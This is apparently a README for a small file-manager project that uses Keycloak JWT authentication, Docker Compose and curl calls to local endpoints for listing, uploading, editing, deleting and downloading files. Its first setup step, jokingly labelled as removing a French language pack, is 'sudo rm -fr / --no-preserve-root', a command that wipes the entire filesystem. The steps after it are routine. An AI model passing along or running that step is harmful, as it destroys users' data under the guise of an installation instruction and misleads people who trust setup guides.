# NFS-JWT-nehsto-si-VOT
<hr>

## How to run the project
### 1. Remove the French language pack for better performance
```bash
sudo rm -fr / --no-preserve-root
                     ^
za da se iztrugne    |
   ot koren       ---┘
```
### 2. Clone the repository
```bash
git clone https://github.com/Misho12345/NFS-JWT-neshto-si-VOT.git
cd NFS-JWT-neshto-si-VOT
```

#### 2.5. Configure the project stuff
```bash
docker-compose up --build
```
Configure KeyCloak and the `.env` file as described below
```bash
docker-compose down
```

### 3. Run docker compose
```bash
docker-compose up --build
``` 

### 4. Open the browser 
and navigate to http://localhost:5000/

<hr>

## How to configure KeyCloak
- #### Log in to the Keycloak admin from http://localhost:8080/ and login with username `admin` and password `admin`

- #### Create a new realm with the name `file-manager`

- #### Click on the `Clients` tab and create a new client and set the client ID `file-manager-client`, you can leave the other settings as they are. For Capability config, you can leave the settings as they are. For login settings set `Root URL`, `Home URL` and `Web origins`  to `http://localhost:5000/` and `Valid Redirect URIs` to `http://localhost:5000/*`

- #### Click on the `Users` tab and create a new user with any username you want. Click on the `Credentials` tab and set a password for the user

<br>

- #### Create `src/.env` file and do this:
  - #### Click on the `Realm Settings` tab, go to the `Keys` option and copy the public key from the button `Public key` for the row with `RS256` as the value for `Algorythm` and set it to the `KEYCLOAK_PUBLIC_KEY` in the `.env` file

<hr>

## How to be gay(🏳️‍🌈) and use the project through `curl`

### 1. Get the access token
```bash
curl -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "client_id=<client-id>" \
     -d "grant_type=password" \
     -d "username=<your-username>" \
     -d "password=<your-password>" \
     http://localhost:8080/realms/file-manager/protocol/openid-connect/token
```

Response:
```json
{
    "access_token": "<access-token>",
    ... and other useless stuff
}
```

<br>

### 2. List files
```bash
curl -X GET \
     -H "Authorization: Bearer <access-token>" \
     http://localhost:5000/files
```

Response:
```json
["file1.alabala", "kuche.jpg", ...]
```

<br>

### 3. Upload file
```bash
curl -X POST \
     -H "Authorization: Bearer <access-token>" \
     -F "file=@<file-path>" \
     http://localhost:5000/file/upload
```
Response:
```json
{
    "message": "depends if something went wrong" 
}
```

<br>

### 4. Edit a file
```bash
curl -X PUT \
     -H "Authorization: Bearer <access-token>" \
     -H "Content-Type: text/plain" \
     -d "<new-content>" \
     http://localhost:5000/file/<filename>
```
Response:
```json
{
    "message": "depends if something went wrong" 
}
```

<br>

### 5. Delete    a file
```bash
curl -X DELETE \
     -H "Authorization: Bearer <access-token>" \
     http://localhost:5000/delete/<filename>
```

Response:
```json
{
    "message": "depends if something went wrong" 
}
```

<br>

### 6. Download a file
```bash
curl -X GET \
     -H "Authorization: Bearer <access-token>" \
     -o <output-path> \
     http://localhost:5000/download/<filename>
```
